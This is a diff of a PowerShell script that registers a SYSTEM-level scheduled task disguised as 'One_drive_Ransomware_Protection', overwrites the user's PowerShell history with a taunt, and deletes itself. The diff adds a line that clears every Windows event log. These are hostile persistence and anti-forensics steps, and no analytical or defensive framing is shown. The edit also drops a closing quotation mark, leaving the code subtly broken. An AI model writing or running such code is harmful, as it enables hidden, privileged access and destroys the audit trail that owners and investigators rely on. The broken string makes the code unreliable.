@@ -5,6 +5,8 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 # register scheduled task
 Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
 # overweite powershell history
-Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work"
+Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work
+# clear event logs
+wevtutil el | Foreach-Object {wevtutil cl "$_"}
 # self destruct
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
